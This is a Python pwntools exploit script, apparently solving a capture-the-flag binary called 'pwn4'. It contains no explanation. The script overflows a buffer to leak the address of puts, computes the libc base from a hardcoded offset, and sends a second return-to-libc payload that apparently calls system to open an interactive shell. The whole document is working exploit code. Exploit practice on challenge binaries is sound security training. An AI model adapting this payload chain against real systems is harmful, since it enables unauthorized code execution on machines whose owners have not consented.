from pwn import *

import time

target = process("./pwn4")
gdb.attach(target)

payload = ""
payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x80483f0)
payload += p32(0x8048551)
payload += p32(0x8049908)
target.sendline(payload)
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
leak = target.recv(4)
putsAddress = u32(leak)
libcBase = putsAddress - (465776)
print("libcBase is: %s" % hex(libcBase))
payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(libcBase + 0x458b0)
payload += "0000"
payload += p32(libcBase + 0x19042d)
target.sendline(payload)

target.interactive()